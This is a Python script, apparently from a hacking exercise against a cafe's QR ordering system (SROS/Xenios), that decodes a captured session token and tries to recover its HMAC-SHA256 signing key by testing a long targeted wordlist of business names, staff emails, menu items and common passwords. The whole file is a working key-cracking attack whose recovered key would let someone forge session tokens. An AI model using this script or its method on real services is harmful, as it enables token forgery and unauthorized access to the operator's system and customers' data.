import base64
import hashlib
import hmac
import json

# Read the actual token
with open("/workspaces/cafe/investigation/qr_sess_token.txt") as f:
    token = f.read().strip()

parts = token.split('.')
payload_b64 = parts[0]
sig_b64 = parts[1]

def b64url_to_b64(s):
    s = s.replace('-', '+').replace('_', '/')
    pad = 4 - (len(s) % 4)
    if pad != 4:
        s += '=' * pad
    return s

sig_raw = base64.b64decode(b64url_to_b64(sig_b64))

print(f"Token: {token[:40]}...{token[-20:]}")
print(f"Payload: {json.loads(base64.b64decode(b64url_to_b64(payload_b64)))}")
print(f"Signature hex: {sig_raw.hex()}")
print(f"Signature bytes: {len(sig_raw)}")

# Mega wordlist
wordlist = [
    "sros", "SROS", "sros_staff", "SROS staff", "sros2024", "sros2025", "sros2026",
    "xenios", "XENIOS", "Xenios", "xenios2024", "xenios2025", "xenios2026",
    "dejavu", "DejaVu", "deja_vu", "cafedejavu", "CafeDejaVu", "cafe",
    "hackme", "hackathon", "hackme.xenios.in", "xenios.in", "hackme2024", "hackme2025", "hackme2026",
    "arena", "ARENA",
    "DEMOA", "DEMOB", "demoa", "demob",
    "11111111-1111-1111-1111-111111111111",
    "HACK-1", "HACK-2", "HACK-3", "hack1", "hack2", "hack3",
    "A-T1", "A-T2", "at1", "at2",
    "Vault", "vault", "Main", "Patio",
    "arena-hack1", "arena-hack2", "arena-hack3", "arena-a-t1", "arena-a-t2",
    "a0000001-0000-0000-0000-000000000001",
    "a0000001-0000-0000-0000-000000000002",
    "a0000001-0000-0000-0000-000000000003",
    "a0000002-0000-0000-0000-000000000001",
    "a0000002-0000-0000-0000-000000000002",
    "BRB1jRSEl2734dd3Ww9KP", "n7k3",
    "Deja Vu Special Pizza", "Deja Vu Lasagna",
    "Deja Vu Signature Hot Chocolate", "Deja Vu Tiramisu",
    "pizza", "lasagna", "tiramisu", "hot chocolate",
    "continental", "bev", "dessert", "kitchen", "barista",
    "GIZMOIOT", "gizmoiot", "GIZMOIOT INNOVATIONS LLP",
    "Bavdhan", "Pune", "India",
    "Hashir", "hashir", "Vaibhav", "vaibhav",
    "Guest", "xtra",
    "admin", "password", "secret", "qwerty", "letmein", "changeme",
    "123456", "12345678", "1234", "0000", "1111", "2222", "4321", "5555", "7777", "9999",
    "key", "token", "signature", "hmac", "hmac_key", "jwt_secret",
    "test", "demo", "guest", "root", "toor", "welcome",
    "admin123", "staff123", "manager123",
    "qr_sess", "sros_token", "sros_theme", "sros_lang",
    "cafe.deja.vu", "cafedejavu.in",
    "pickyeat",
    "BreakTheQR", "breaktheqr", "break the qr",
    "nginx", "express", "nextjs", "next",
    "2024", "2025", "2026", "0617", "1706",
    "1781714111820", "1781713755587",
    "9001", "1002", "1029", "630", "4200", "800", "0800", "25851",
    "!@#$%", "changethis",
    "ctf", "CTF", "flag", "FLAG",
    "order", "orders", "table", "qr",
    "api", "rest",
    "staff", "kitchen", "waiter", "pos", "manager", "owner",
    "customer", "guest",
    "Sup3rS3cr3t", "SuperSecret", "s3cr3t",
    "demo-outlet", "hack-arena", "Hack Arena",
    "xenios-api", "sros-api",
    "hash", "hmac-sha256", "sha256",
    "break", "sandbox", "geofence", "bypass",
    "admin@xenios.in", "staff@xenios.in", "manager@xenios.in",
    "kitchen@xenios.in", "pos@xenios.in", "owner@xenios.in",
    "SROS", "sros_staff",
    "302e302e302e", "1.0.0",
    "7MOJYnIX0", "hack1", "hack2", "hack3",
    "80085", "1337", "1234567890",
    "#1M0M3nT", "n3v3r", "g0nn4", "g1v3", "y0u", "up",
    "never", "gonna", "give", "you", "up",
    "rick", "astley", "roll",
    "hashir123",
    "SROS2026",
    "X3n10s", "x3n10s",
    "4r3n4", "4r3na",
    "d3j4_vu", "d3javu",
    "h4ckm3", "h4ckme",
]

print(f"\nTrying {len(wordlist)} keys...")

for i, key in enumerate(wordlist):
    h = hmac.new(key.encode(), payload_b64.encode(), hashlib.sha256)
    if h.digest() == sig_raw:
        print(f"\n✅ FOUND KEY: {key}")
        with open("/workspaces/cafe/hmac_key.txt", "w") as f:
            f.write(key)
        exit(0)

print("\n❌ Key not found in wordlist.")
print(f"\nTry brute-force with rockyou or check if format is different.")